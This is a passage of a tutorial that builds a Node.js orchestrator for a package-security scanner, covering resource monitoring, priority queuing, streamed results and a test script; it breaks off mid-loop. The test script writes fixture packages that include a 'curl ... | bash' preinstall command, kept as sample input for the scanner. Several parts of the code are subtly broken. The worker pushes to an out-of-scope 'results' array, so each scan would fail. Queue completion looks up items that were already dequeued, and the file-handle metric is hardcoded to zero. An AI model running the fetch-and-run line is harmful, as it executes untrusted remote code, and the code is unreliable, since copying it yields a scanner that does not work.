# Phase 3, Part 2: Advanced Orchestration and Resource Management

Now we'll build advanced orchestration capabilities for our scanner, including resource pools, memory management, streaming results, priority queuing, and production-ready monitoring. This transforms our scanner from a useful tool into an enterprise-grade security solution.

---

## The Target: Advanced Orchestration Layer

**What specific file, configuration, or feature are we building right now?**

We're building an advanced orchestration system that includes:
1. Resource pool management for CPU and memory
2. Memory-aware scheduling to prevent OOM errors
3. Streaming results for real-time processing
4. Priority-based queuing for critical packages
5. Health checks and monitoring
6. Graceful shutdown and cleanup
7. Metrics collection and reporting

---

## The Concept: The Air Traffic Control System

**A brief, clear explanation using a simple, real-world analogy**

Think of our orchestration system like air traffic control at a busy airport:

1. **Resource Management** - Like knowing how many runways are available and how many planes can land at once
2. **Memory Awareness** - Like knowing the airport's capacity and not scheduling more planes than it can handle
3. **Priority Queuing** - Like giving emergency landings priority over scheduled arrivals
4. **Streaming Results** - Like providing real-time updates to the terminal about arriving flights
5. **Health Checks** - Like checking that the runway lights are working and the radar is functional
6. **Graceful Shutdown** - Like safely diverting planes when the airport needs to close unexpectedly
7. **Metrics** - Like tracking how many flights were delayed, canceled, or on-time

---

## The Implementation: Advanced Orchestration

### Step 1: Install Additional Dependencies

```bash
# Navigate to the phase-3 directory
cd beyond-cves-tutorial/phase-3

# Install additional dependencies
npm install --save-dev node-cron
npm install --save-dev pidusage
npm install --save-dev systeminformation
npm install --save-dev stream-json
npm install --save-dev cli-table3
```

### Step 2: Create the Resource Manager

```javascript
// path: phase-3/src/resource-manager.js

/**
 * RESOURCE MANAGER
 * 
 * Manages system resources including CPU, memory, and file handles.
 * Prevents resource exhaustion and provides graceful degradation.
 * 
 * Usage:
 *   const manager = new ResourceManager();
 *   await manager.checkHealth();
 *   const available = await manager.getAvailableResources();
 */

const os = require('os');
const pidusage = require('pidusage');
const si = require('systeminformation');
const { EventEmitter } = require('events');

class ResourceManager extends EventEmitter {
    constructor(options = {}) {
        super();
        
        this.options = {
            maxMemoryPercent: options.maxMemoryPercent || 80, // 80% max memory usage
            maxCpuPercent: options.maxCpuPercent || 80, // 80% max CPU usage
            maxFileHandles: options.maxFileHandles || 1000,
            checkInterval: options.checkInterval || 5000, // 5 seconds
            ...options
        };
        
        this.metrics = {
            memory: {
                total: 0,
                used: 0,
                free: 0,
                percent: 0
            },
            cpu: {
                load: 0,
                cores: 0,
                percent: 0
            },
            fileHandles: {
                current: 0,
                max: 0,
                percent: 0
            },
            uptime: 0
        };
        
        this.isHealthy = true;
        this.healthChecks = [];
        this.lastCheck = null;
        this.checkInterval = null;
        
        // Start monitoring
        this.startMonitoring();
    }

    /**
     * Starts the monitoring interval
     */
    startMonitoring() {
        this.checkInterval = setInterval(() => {
            this.updateMetrics();
        }, this.options.checkInterval);
        
        // Run initial check
        this.updateMetrics();
    }

    /**
     * Stops the monitoring interval
     */
    stopMonitoring() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
    }

    /**
     * Updates system metrics
     */
    async updateMetrics() {
        try {
            // Memory metrics
            const mem = os.totalmem();
            const freeMem = os.freemem();
            const usedMem = mem - freeMem;
            
            this.metrics.memory = {
                total: mem,
                used: usedMem,
                free: freeMem,
                percent: (usedMem / mem) * 100
            };
            
            // CPU metrics
            const cpus = os.cpus();
            const loadAvg = os.loadavg();
            
            this.metrics.cpu = {
                load: loadAvg[0],
                cores: cpus.length,
                percent: (loadAvg[0] / cpus.length) * 100
            };
            
            // File handle metrics
            try {
                const fileInfo = await si.fsSize();
                const totalFD = 0; // This is approximate
                const maxFD = this.options.maxFileHandles;
                
                this.metrics.fileHandles = {
                    current: totalFD,
                    max: maxFD,
                    percent: (totalFD / maxFD) * 100
                };
            } catch (error) {
                // If systeminformation fails, use estimates
                this.metrics.fileHandles = {
                    current: 0,
                    max: this.options.maxFileHandles,
                    percent: 0
                };
            }
            
            // Uptime
            this.metrics.uptime = os.uptime();
            
            // Update health status
            this.checkHealth();
            
            this.lastCheck = Date.now();
            this.emit('metrics', this.metrics);
            
        } catch (error) {
            this.emit('error', error);
        }
    }

    /**
     * Checks system health
     */
    checkHealth() {
        const issues = [];
        
        // Check memory
        if (this.metrics.memory.percent > this.options.maxMemoryPercent) {
            issues.push({
                type: 'MEMORY',
                severity: 'WARNING',
                message: `Memory usage at ${this.metrics.memory.percent.toFixed(1)}% (threshold: ${this.options.maxMemoryPercent}%)`
            });
        }
        
        // Check CPU
        if (this.metrics.cpu.percent > this.options.maxCpuPercent) {
            issues.push({
                type: 'CPU',
                severity: 'WARNING',
                message: `CPU usage at ${this.metrics.cpu.percent.toFixed(1)}% (threshold: ${this.options.maxCpuPercent}%)`
            });
        }
        
        // Check file handles
        if (this.metrics.fileHandles.percent > 90) {
            issues.push({
                type: 'FILE_HANDLES',
                severity: 'WARNING',
                message: `File handle usage at ${this.metrics.fileHandles.percent.toFixed(1)}%`
            });
        }
        
        // Update health status
        this.isHealthy = issues.length === 0;
        
        if (issues.length > 0) {
            this.emit('healthWarning', issues);
        }
        
        return {
            isHealthy: this.isHealthy,
            issues,
            metrics: this.metrics
        };
    }

    /**
     * Gets available resources for processing
     */
    async getAvailableResources() {
        await this.updateMetrics();
        
        const available = {
            memory: {
                available: this.metrics.memory.free,
                percentAvailable: 100 - this.metrics.memory.percent,
                canProcess: this.metrics.memory.percent < this.options.maxMemoryPercent
            },
            cpu: {
                available: 100 - this.metrics.cpu.percent,
                canProcess: this.metrics.cpu.percent < this.options.maxCpuPercent
            },
            canProcess: this.isHealthy && 
                        this.metrics.memory.percent < this.options.maxMemoryPercent &&
                        this.metrics.cpu.percent < this.options.maxCpuPercent
        };
        
        return available;
    }

    /**
     * Waits until resources are available
     */
    async waitForResources(priority = 'normal') {
        const maxWait = 300000; // 5 minutes
        const startTime = Date.now();
        
        while (Date.now() - startTime < maxWait) {
            const resources = await this.getAvailableResources();
            
            if (resources.canProcess) {
                return true;
            }
            
            // Calculate wait time based on priority
            const waitTime = priority === 'high' ? 1000 :
                            priority === 'critical' ? 500 :
                            2000;
            
            await this.delay(waitTime);
        }
        
        throw new Error('Resource wait timeout');
    }

    /**
     * Delays execution
     */
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Gets system information for reporting
     */
    async getSystemInfo() {
        return {
            platform: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            cpus: os.cpus().length,
            totalMemory: os.totalmem(),
            uptime: os.uptime(),
            loadAverage: os.loadavg(),
            nodeVersion: process.version,
            processMemory: process.memoryUsage(),
            metrics: this.metrics
        };
    }

    /**
     * Cleans up resources
     */
    cleanup() {
        this.stopMonitoring();
        this.removeAllListeners();
    }
}

module.exports = ResourceManager;
```

### Step 3: Create the Priority Queue Manager

```javascript
// path: phase-3/src/priority-queue.js

/**
 * PRIORITY QUEUE MANAGER
 * 
 * Manages queues with priority levels for different types of packages.
 * Critical packages get processed first, low-priority packages wait.
 * 
 * Usage:
 *   const queue = new PriorityQueue();
 *   queue.add('package', 'critical');
 *   const item = queue.next();
 */

const { EventEmitter } = require('events');

class PriorityQueue extends EventEmitter {
    constructor(options = {}) {
        super();
        
        this.options = {
            maxSize: options.maxSize || 10000,
            priorities: options.priorities || ['critical', 'high', 'medium', 'low', 'background'],
            defaultPriority: options.defaultPriority || 'medium',
            ...options
        };
        
        // Initialize priority queues
        this.queues = {};
        for (const priority of this.options.priorities) {
            this.queues[priority] = [];
        }
        
        this.totalItems = 0;
        this.processedItems = 0;
        this.failedItems = 0;
        this.stats = {
            added: 0,
            removed: 0,
            processed: 0,
            failed: 0,
            byPriority: {}
        };
        
        for (const priority of this.options.priorities) {
            this.stats.byPriority[priority] = {
                added: 0,
                processed: 0,
                failed: 0
            };
        }
    }

    /**
     * Adds an item to the queue
     * @param {*} item - Item to add
     * @param {string} priority - Priority level
     * @param {Object} metadata - Additional metadata
     */
    add(item, priority = this.options.defaultPriority, metadata = {}) {
        // Validate priority
        if (!this.options.priorities.includes(priority)) {
            priority = this.options.defaultPriority;
        }
        
        // Check queue size
        if (this.totalItems >= this.options.maxSize) {
            throw new Error(`Queue size limit reached (${this.options.maxSize})`);
        }
        
        const queueItem = {
            id: this.generateId(),
            item,
            priority,
            metadata,
            addedAt: Date.now(),
            attempts: 0,
            status: 'pending' // pending, processing, completed, failed
        };
        
        this.queues[priority].push(queueItem);
        this.totalItems++;
        this.stats.added++;
        this.stats.byPriority[priority].added++;
        
        this.emit('itemAdded', queueItem);
        
        return queueItem.id;
    }

    /**
     * Gets the next item from the queue (highest priority first)
     */
    next() {
        // Find the highest priority queue with items
        for (const priority of this.options.priorities) {
            if (this.queues[priority].length > 0) {
                const item = this.queues[priority].shift();
                item.status = 'processing';
                this.emit('itemProcessing', item);
                return item;
            }
        }
        
        return null;
    }

    /**
     * Marks an item as completed
     */
    complete(itemId, result = null) {
        this.processedItems++;
        this.stats.processed++;
        
        // Find and remove the item from the queue
        const removed = this.removeItem(itemId);
        if (removed) {
            const priority = removed.priority;
            this.stats.byPriority[priority].processed++;
            this.emit('itemCompleted', { id: itemId, result });
        }
    }

    /**
     * Marks an item as failed
     */
    fail(itemId, error = null) {
        this.failedItems++;
        this.stats.failed++;
        
        const removed = this.removeItem(itemId);
        if (removed) {
            const priority = removed.priority;
            this.stats.byPriority[priority].failed++;
            this.emit('itemFailed', { id: itemId, error });
        }
    }

    /**
     * Removes an item from the queue
     */
    removeItem(itemId) {
        for (const priority of this.options.priorities) {
            const index = this.queues[priority].findIndex(item => item.id === itemId);
            if (index !== -1) {
                const removed = this.queues[priority].splice(index, 1)[0];
                this.totalItems--;
                this.stats.removed++;
                return removed;
            }
        }
        return null;
    }

    /**
     * Gets the current queue status
     */
    getStatus() {
        const status = {
            total: this.totalItems,
            processed: this.processedItems,
            failed: this.failedItems,
            pending: 0,
            byPriority: {}
        };
        
        for (const priority of this.options.priorities) {
            const count = this.queues[priority].length;
            status.byPriority[priority] = {
                pending: count,
                processed: this.stats.byPriority[priority].processed || 0,
                failed: this.stats.byPriority[priority].failed || 0
            };
            status.pending += count;
        }
        
        return status;
    }

    /**
     * Clears the queue
     */
    clear() {
        for (const priority of this.options.priorities) {
            this.queues[priority] = [];
        }
        this.totalItems = 0;
        this.processedItems = 0;
        this.failedItems = 0;
        this.emit('queueCleared');
    }

    /**
     * Generates a unique ID
     */
    generateId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    }

    /**
     * Checks if the queue is empty
     */
    isEmpty() {
        return this.totalItems === 0;
    }

    /**
     * Gets the size of the queue
     */
    size() {
        return this.totalItems;
    }
}

module.exports = PriorityQueue;
```

### Step 4: Create the Streaming Result Manager

```javascript
// path: phase-3/src/streaming-results.js

/**
 * STREAMING RESULTS MANAGER
 * 
 * Streams scan results in real-time for processing and monitoring.
 * Supports multiple output formats and destinations.
 * 
 * Usage:
 *   const stream = new StreamingResults();
 *   stream.on('result', (result) => { ... });
 *   stream.write(result);
 */

const { EventEmitter } = require('events');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');

class StreamingResults extends EventEmitter {
    constructor(options = {}) {
        super();
        
        this.options = {
            outputFile: options.outputFile || null,
            format: options.format || 'json', // json, csv, ndjson
            bufferSize: options.bufferSize || 100,
            flushInterval: options.flushInterval || 5000, // 5 seconds
            ...options
        };
        
        this.results = [];
        this.buffer = [];
        this.totalResults = 0;
        this.startTime = Date.now();
        this.isStreaming = false;
        this.writeStream = null;
        
        // Set up output file if specified
        if (this.options.outputFile) {
            this.setupOutputFile();
        }
        
        // Set up flush interval
        this.flushInterval = setInterval(() => {
            this.flush();
        }, this.options.flushInterval);
    }

    /**
     * Sets up the output file
     */
    setupOutputFile() {
        const dir = path.dirname(this.options.outputFile);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        
        // Create write stream
        this.writeStream = fs.createWriteStream(this.options.outputFile, { flags: 'a' });
        
        // Write header for CSV
        if (this.options.format === 'csv') {
            this.writeStream.write('timestamp,package,version,riskScore,riskLevel,status\n');
        }
    }

    /**
     * Writes a result to the stream
     */
    write(result) {
        this.totalResults++;
        this.buffer.push(result);
        
        // Emit event for real-time processing
        this.emit('result', result);
        this.emit('progress', {
            total: this.totalResults,
            buffered: this.buffer.length,
            timestamp: Date.now()
        });
        
        // Flush if buffer is full
        if (this.buffer.length >= this.options.bufferSize) {
            this.flush();
        }
    }

    /**
     * Writes multiple results to the stream
     */
    writeAll(results) {
        for (const result of results) {
            this.write(result);
        }
    }

    /**
     * Flushes the buffer to the output
     */
    flush() {
        if (this.buffer.length === 0) return;
        
        const data = this.buffer.slice();
        this.buffer = [];
        
        // Emit flush event
        this.emit('flush', data);
        
        // Write to file if configured
        if (this.writeStream) {
            this.writeToFile(data);
        }
        
        // Add to results array
        this.results.push(...data);
    }

    /**
     * Writes data to the output file
     */
    writeToFile(data) {
        if (!this.writeStream) return;
        
        for (const item of data) {
            let line;
            
            switch (this.options.format) {
                case 'json':
                    line = JSON.stringify(item) + '\n';
                    break;
                case 'ndjson':
                    line = JSON.stringify(item) + '\n';
                    break;
                case 'csv':
                    line = this.toCSV(item) + '\n';
                    break;
                default:
                    line = JSON.stringify(item) + '\n';
            }
            
            this.writeStream.write(line);
        }
    }

    /**
     * Converts a result to CSV format
     */
    toCSV(result) {
        const timestamp = new Date().toISOString();
        const packageName = result.name || 'unknown';
        const version = result.version || 'unknown';
        const riskScore = result.riskScore || 0;
        const riskLevel = result.riskLevel || 'UNKNOWN';
        const status = result.status || 'unknown';
        
        return `${timestamp},${packageName},${version},${riskScore},${riskLevel},${status}`;
    }

    /**
     * Gets all results
     */
    getAllResults() {
        this.flush(); // Ensure all data is written
        return this.results;
    }

    /**
     * Gets results filtered by a criteria
     */
    getResults(filter) {
        this.flush();
        
        if (!filter) return this.results;
        
        return this.results.filter(item => {
            if (filter.minRiskScore && item.riskScore < filter.minRiskScore) return false;
            if (filter.maxRiskScore && item.riskScore > filter.maxRiskScore) return false;
            if (filter.riskLevel && item.riskLevel !== filter.riskLevel) return false;
            if (filter.status && item.status !== filter.status) return false;
            if (filter.packageName && !item.name.includes(filter.packageName)) return false;
            return true;
        });
    }

    /**
     * Gets summary statistics
     */
    getSummary() {
        this.flush();
        
        const summary = {
            total: this.totalResults,
            startTime: this.startTime,
            endTime: Date.now(),
            duration: Date.now() - this.startTime,
            byStatus: {},
            byRiskLevel: {},
            averageScore: 0,
            maxScore: 0,
            minScore: 100
        };
        
        let scoreSum = 0;
        let scoreCount = 0;
        
        for (const result of this.results) {
            // Status counts
            const status = result.status || 'unknown';
            summary.byStatus[status] = (summary.byStatus[status] || 0) + 1;
            
            // Risk level counts
            const level = result.riskLevel || 'UNKNOWN';
            summary.byRiskLevel[level] = (summary.byRiskLevel[level] || 0) + 1;
            
            // Score statistics
            if (result.riskScore !== undefined && result.riskScore !== null) {
                scoreSum += result.riskScore;
                scoreCount++;
                summary.maxScore = Math.max(summary.maxScore, result.riskScore);
                summary.minScore = Math.min(summary.minScore, result.riskScore);
            }
        }
        
        summary.averageScore = scoreCount > 0 ? scoreSum / scoreCount : 0;
        
        return summary;
    }

    /**
     * Closes the stream
     */
    close() {
        this.flush();
        
        if (this.flushInterval) {
            clearInterval(this.flushInterval);
            this.flushInterval = null;
        }
        
        if (this.writeStream) {
            this.writeStream.end();
            this.writeStream = null;
        }
        
        this.isStreaming = false;
        this.emit('closed');
    }

    /**
     * Generates a report from the results
     */
    generateReport() {
        const summary = this.getSummary();
        const results = this.getAllResults();
        
        // Group results by risk level
        const byRiskLevel = {};
        for (const level of ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'UNKNOWN']) {
            byRiskLevel[level] = results.filter(r => r.riskLevel === level);
        }
        
        // Generate recommendations
        const recommendations = [];
        if (byRiskLevel.CRITICAL.length > 0) {
            recommendations.push({
                severity: 'CRITICAL',
                message: `Found ${byRiskLevel.CRITICAL.length} packages with critical risk`,
                packages: byRiskLevel.CRITICAL.map(r => r.name)
            });
        }
        if (byRiskLevel.HIGH.length > 0) {
            recommendations.push({
                severity: 'HIGH',
                message: `Found ${byRiskLevel.HIGH.length} packages with high risk`,
                packages: byRiskLevel.HIGH.map(r => r.name)
            });
        }
        
        return {
            summary,
            results,
            byRiskLevel,
            recommendations,
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Prints a summary to the console
     */
    printSummary() {
        const summary = this.getSummary();
        
        console.log('\n' + chalk.bold.cyan('='.repeat(60)));
        console.log(chalk.bold.cyan('📊 STREAMING RESULTS SUMMARY'));
        console.log(chalk.cyan('='.repeat(60)));
        console.log('');
        
        console.log(chalk.bold('📦 Total Results:'), summary.total);
        console.log(chalk.bold('⏱️  Duration:'), `${(summary.duration / 1000).toFixed(2)}s`);
        console.log('');
        
        console.log(chalk.bold('📊 Status Breakdown:'));
        for (const [status, count] of Object.entries(summary.byStatus)) {
            const color = status === 'success' ? chalk.green :
                         status === 'failed' ? chalk.red :
                         chalk.yellow;
            console.log(`   ${color(status.padEnd(12))}: ${count}`);
        }
        console.log('');
        
        console.log(chalk.bold('🎯 Risk Level Breakdown:'));
        const riskColors = {
            CRITICAL: chalk.red.bold,
            HIGH: chalk.yellow.bold,
            MEDIUM: chalk.yellow,
            LOW: chalk.green,
            UNKNOWN: chalk.gray
        };
        for (const [level, count] of Object.entries(summary.byRiskLevel)) {
            if (count > 0) {
                const color = riskColors[level] || chalk.white;
                console.log(`   ${color(level.padEnd(10))}: ${count}`);
            }
        }
        console.log('');
        
        console.log(chalk.bold('📈 Score Statistics:'));
        console.log(`   Average: ${summary.averageScore.toFixed(1)}`);
        console.log(`   Max: ${summary.maxScore.toFixed(1)}`);
        console.log(`   Min: ${summary.minScore.toFixed(1)}`);
        console.log('');
        
        console.log(chalk.cyan('='.repeat(60)));
    }
}

module.exports = StreamingResults;
```

### Step 5: Create the Main Orchestrator

```javascript
// path: phase-3/src/orchestrator.js

/**
 * MAIN ORCHESTRATOR
 * 
 * Combines all components into a cohesive orchestration system.
 * Manages scanning workflows with resource awareness, priority queuing,
 * and streaming results.
 * 
 * Usage:
 *   const orchestrator = new Orchestrator();
 *   await orchestrator.scanPackages(packageList);
 */

const chalk = require('chalk');
const ora = require('ora');
const PackageScanner = require('./package-scanner');
const ResourceManager = require('./resource-manager');
const PriorityQueue = require('./priority-queue');
const StreamingResults = require('./streaming-results');

class Orchestrator {
    constructor(options = {}) {
        this.options = {
            concurrency: options.concurrency || 5,
            timeout: options.timeout || 60000,
            retries: options.retries || 2,
            maxMemoryPercent: options.maxMemoryPercent || 80,
            maxCpuPercent: options.maxCpuPercent || 80,
            outputFile: options.outputFile || null,
            verbose: options.verbose || false,
            ...options
        };
        
        // Initialize components
        this.resourceManager = new ResourceManager({
            maxMemoryPercent: this.options.maxMemoryPercent,
            maxCpuPercent: this.options.maxCpuPercent
        });
        
        this.priorityQueue = new PriorityQueue({
            maxSize: 10000
        });
        
        this.streamingResults = new StreamingResults({
            outputFile: this.options.outputFile,
            format: 'json'
        });
        
        this.packageScanner = new PackageScanner({
            concurrency: this.options.concurrency,
            timeout: this.options.timeout,
            retries: this.options.retries,
            verbose: this.options.verbose
        });
        
        // Set up event listeners
        this.setupEventListeners();
        
        // State tracking
        this.isRunning = false;
        this.currentWorkers = [];
        this.scanId = Date.now().toString(36);
    }

    /**
     * Sets up event listeners
     */
    setupEventListeners() {
        // Resource manager events
        this.resourceManager.on('metrics', (metrics) => {
            if (this.options.verbose) {
                console.log(chalk.gray(`📊 Memory: ${metrics.memory.percent.toFixed(1)}% | CPU: ${metrics.cpu.percent.toFixed(1)}%`));
            }
        });
        
        this.resourceManager.on('healthWarning', (issues) => {
            console.log(chalk.yellow('⚠️  Health Warning:'));
            for (const issue of issues) {
                console.log(chalk.yellow(`   ${issue.message}`));
            }
        });
        
        // Priority queue events
        this.priorityQueue.on('itemAdded', (item) => {
            if (this.options.verbose) {
                console.log(chalk.gray(`📥 Added to queue: ${item.item.name} (${item.priority})`));
            }
        });
        
        this.priorityQueue.on('itemProcessing', (item) => {
            if (this.options.verbose) {
                console.log(chalk.blue(`🔄 Processing: ${item.item.name}`));
            }
        });
        
        // Streaming results events
        this.streamingResults.on('result', (result) => {
            if (this.options.verbose) {
                const statusColor = result.status === 'success' ? chalk.green :
                                   result.status === 'failed' ? chalk.red :
                                   chalk.yellow;
                console.log(`${statusColor('✓')} ${result.name}@${result.version} | Score: ${result.riskScore || 'N/A'} | Level: ${result.riskLevel || 'UNKNOWN'}`);
            }
        });
    }

    /**
     * Scans a list of packages
     */
    async scanPackages(packages) {
        if (this.isRunning) {
            throw new Error('Scan already in progress');
        }
        
        this.isRunning = true;
        this.scanId = Date.now().toString(36);
        
        console.log(chalk.bold.cyan('\n🚀 Starting Orchestrated Security Scan'));
        console.log(chalk.gray(`📦 ${packages.length} packages to scan`));
        console.log(chalk.gray(`⚡ Concurrency: ${this.options.concurrency}`));
        console.log(chalk.gray(`💾 Max Memory: ${this.options.maxMemoryPercent}%`));
        console.log(chalk.gray(`🔄 Max CPU: ${this.options.maxCpuPercent}%`));
        console.log(chalk.gray(`⏱️  Timeout: ${this.options.timeout}ms`));
        console.log(chalk.gray(`🔄 Retries: ${this.options.retries}`));
        console.log('');
        
        try {
            // 1. Add packages to priority queue
            console.log(chalk.blue('📋 Adding packages to queue...'));
            const spinner = ora('Processing queue...').start();
            
            for (const pkg of packages) {
                // Determine priority based on package type
                let priority = 'medium';
                if (pkg.priority) {
                    priority = pkg.priority;
                } else if (pkg.type === 'critical') {
                    priority = 'critical';
                } else if (pkg.type === 'production') {
                    priority = 'high';
                }
                
                this.priorityQueue.add(pkg, priority, {
                    source: 'orchestrator',
                    scanId: this.scanId
                });
            }
            
            spinner.succeed(`Added ${packages.length} packages to queue`);
            
            // 2. Process packages
            const results = await this.processQueue();
            
            // 3. Generate final report
            const report = this.streamingResults.generateReport();
            
            // 4. Clean up
            this.cleanup();
            
            return {
                scanId: this.scanId,
                results,
                report,
                summary: this.streamingResults.getSummary(),
                recommendations: report.recommendations
            };
            
        } catch (error) {
            console.error(chalk.red(`❌ Scan failed: ${error.message}`));
            throw error;
        } finally {
            this.isRunning = false;
        }
    }

    /**
     * Processes the queue with resource awareness
     */
    async processQueue() {
        console.log(chalk.blue('🔄 Processing packages with resource management...'));
        
        const results = [];
        const workers = [];
        const concurrency = Math.min(
            this.options.concurrency,
            Math.floor(require('os').cpus().length * 0.75)
        );
        
        // Create worker pool
        for (let i = 0; i < concurrency; i++) {
            workers.push(this.worker(i));
        }
        
        // Wait for all workers to complete
        await Promise.all(workers);
        
        console.log(chalk.green(`✅ All packages processed (${results.length} total)`));
        
        return results;
    }

    /**
     * Worker function that processes items from the queue
     */
    async worker(workerId) {
        while (!this.priorityQueue.isEmpty()) {
            // Check resources before processing
            try {
                await this.resourceManager.waitForResources('normal');
            } catch (error) {
                console.log(chalk.yellow(`⏸️  Worker ${workerId} paused (resources unavailable)`));
                await this.delay(5000);
                continue;
            }
            
            // Get next item from queue
            const queueItem = this.priorityQueue.next();
            if (!queueItem) break;
            
            const pkg = queueItem.item;
            
            try {
                // Process the package
                const result = await this.processPackage(pkg);
                
                // Complete the queue item
                this.priorityQueue.complete(queueItem.id, result);
                
                // Stream the result
                this.streamingResults.write(result);
                
                results.push(result);
                
            } catch (error) {
                // Fail the queue item
                this.priorityQueue.fail(queueItem.id, error);
                
                // Stream the error
                this.streamingResults.write({
                    name: pkg.name,
                    version: pkg.version,
                    status: 'failed',
                    error: error.message
                });
            }
        }
    }

    /**
     * Processes a single package
     */
    async processPackage(pkg) {
        // Use the package scanner
        const result = await this.packageScanner.scanPackage(pkg, null);
        return result;
    }

    /**
     * Delays execution
     */
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Cleans up resources
     */
    cleanup() {
        this.resourceManager.cleanup();
        this.streamingResults.close();
        this.isRunning = false;
    }

    /**
     * Gets the current status
     */
    getStatus() {
        return {
            isRunning: this.isRunning,
            scanId: this.scanId,
            queue: this.priorityQueue.getStatus(),
            resources: {
                memory: this.resourceManager.metrics.memory,
                cpu: this.resourceManager.metrics.cpu,
                isHealthy: this.resourceManager.isHealthy
            },
            results: this.streamingResults.getSummary()
        };
    }

    /**
     * Generates a CI/CD report
     */
    getCIReport() {
        const summary = this.streamingResults.getSummary();
        const results = this.streamingResults.getAllResults();
        
        return {
            scanId: this.scanId,
            timestamp: new Date().toISOString(),
            status: summary.byStatus.failed === 0 ? 'PASS' : 'FAIL',
            summary: {
                total: summary.total,
                successful: summary.byStatus.success || 0,
                failed: summary.byStatus.failed || 0,
                critical: summary.byRiskLevel.CRITICAL || 0,
                high: summary.byRiskLevel.HIGH || 0,
                medium: summary.byRiskLevel.MEDIUM || 0,
                low: summary.byRiskLevel.LOW || 0,
                averageScore: summary.averageScore
            },
            results: results.map(r => ({
                name: r.name,
                version: r.version,
                riskScore: r.riskScore,
                riskLevel: r.riskLevel,
                status: r.status
            })),
            recommendations: this.generateRecommendations(summary)
        };
    }

    /**
     * Generates recommendations
     */
    generateRecommendations(summary) {
        const recommendations = [];
        
        if (summary.byRiskLevel.CRITICAL > 0) {
            recommendations.push({
                severity: 'CRITICAL',
                action: 'BLOCK',
                message: `Block ${summary.byRiskLevel.CRITICAL} packages with critical risk`,
                packages: this.streamingResults.getAllResults()
                    .filter(r => r.riskLevel === 'CRITICAL')
                    .map(r => r.name)
            });
        }
        
        if (summary.byRiskLevel.HIGH > 0) {
            recommendations.push({
                severity: 'HIGH',
                action: 'REVIEW',
                message: `Review ${summary.byRiskLevel.HIGH} packages with high risk`,
                packages: this.streamingResults.getAllResults()
                    .filter(r => r.riskLevel === 'HIGH')
                    .map(r => r.name)
            });
        }
        
        if (summary.byStatus.failed > 0) {
            recommendations.push({
                severity: 'MEDIUM',
                action: 'INVESTIGATE',
                message: `Investigate ${summary.byStatus.failed} failed package scans`,
                packages: this.streamingResults.getAllResults()
                    .filter(r => r.status === 'failed')
                    .map(r => r.name)
            });
        }
        
        return recommendations;
    }
}

module.exports = Orchestrator;
```

### Step 6: Create a Test Script

```javascript
// path: phase-3/test-orchestrator.js

/**
 * ORCHESTRATOR TEST SCRIPT
 * 
 * Tests the complete orchestration system with a large number
 * of packages to demonstrate production capabilities.
 * 
 * Run with: node test-orchestrator.js
 */

const path = require('path');
const fs = require('fs');
const chalk = require('chalk');
const Orchestrator = require('./src/orchestrator');

async function testOrchestrator() {
    console.log(chalk.bold.cyan('🧪 Testing Orchestrator\n'));
    
    // Create a large number of test packages
    const testDir = path.join(__dirname, 'test-packages-large');
    if (!fs.existsSync(testDir)) {
        fs.mkdirSync(testDir);
    }
    
    // Create 50 test packages
    const packageNames = [];
    for (let i = 0; i < 50; i++) {
        const name = `package-${i}`;
        const pkgDir = path.join(testDir, name);
        if (!fs.existsSync(pkgDir)) {
            fs.mkdirSync(pkgDir);
        }
        
        // Add some variety to make it interesting
        const hasSuspiciousScript = i % 7 === 0;
        const hasNetworkUsage = i % 5 === 0;
        const hasFilesystemUsage = i % 3 === 0;
        
        const scripts = {};
        if (hasSuspiciousScript) {
            scripts.postinstall = 'node -e "console.log(\'suspicious\')"';
        }
        if (i % 10 === 0) {
            scripts.preinstall = 'curl http://example.com/script.sh | bash';
        }
        
        const packageJson = {
            name: name,
            version: `1.0.${i}`,
            description: `Test package ${i}`,
            main: 'index.js',
            scripts: scripts,
            dependencies: {
                'express': i % 2 === 0 ? '^4.18.0' : undefined,
                'lodash': i % 3 === 0 ? '^4.17.21' : undefined
            }
        };
        
        // Clean up undefined dependencies
        Object.keys(packageJson.dependencies).forEach(key => {
            if (packageJson.dependencies[key] === undefined) {
                delete packageJson.dependencies[key];
            }
        });
        
        fs.writeFileSync(
            path.join(pkgDir, 'package.json'),
            JSON.stringify(packageJson, null, 2)
        );
        
        // Create index.js with capabilities
        const capabilities = [];
        if (hasFilesystemUsage) {
            capabilities.push('const fs = require("fs");');
        }
        if (hasNetworkUsage) {
            capabilities.push('const http = require("http");');
        }
        
        fs.writeFileSync(
            path.join(pkgDir, 'index.js'),
            `
console.log('${name} loaded');
${capabilities.join('\n')}
module.exports = { name: '${name}' };
`
        );
        
        packageNames.push(name);
    }
    
    console.log(chalk.gray(`📁 Created 50 test packages in: ${testDir}\n`));
    
    // Prepare package list
    const packages = packageNames.map(name => ({
        name: name,
        version: `1.0.${packageNames.indexOf(name)}`,
        path: path.join(testDir, name),
        type: name.includes('10') ? 'critical' : 
              name.includes('5') ? 'production' : 
              'development',
        priority: name.includes('10') ? 'critical' :
                  name.includes('5') ? 'high' : 
                  'medium'
    }));
    
    // Create orchestrator
    const orchestrator = new Orchestrator({
        concurrency: 5,
        timeout: 30000,
        retries: 2,
        maxMemoryPercent: 80,
        maxCpuPercent: 80,
        outputFile: 'orchestrator-results.json',
        verbose: false
    });
    
    // Run the scan
    console.log(chalk.blue('🚀 Starting orchestrator scan...\n'));
    const startTime = Date.now();
    
    try {
        const results = await orchestrator.scanPackages(packages);
        
        const duration = Date.now() - startTime;
        
        // Print results
        console.log('\n' + chalk.bold.green('✅ Orchestrator Scan Complete!'));
        console.log(chalk.gray(`⏱️  Duration: ${(duration / 1000).toFixed(2)}s`));
        console.log(chalk.gray(`📦 Packages: ${results.summary.total}`));
        console.log(chalk.gray(`✅ Successful: ${results.summary.byStatus.success || 0}`));
        console.log(chalk.gray(`❌ Failed: ${results.summary.byStatus.failed || 0}`));
        
        // Print risk distribution
        console.log('\n' + chalk.bold('🎯 Risk Distribution:'));
        const riskLevels = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'UNKNOWN'];
        for (const level of riskLevels) {
            const count = results.summary.byRiskLevel[level] || 0;
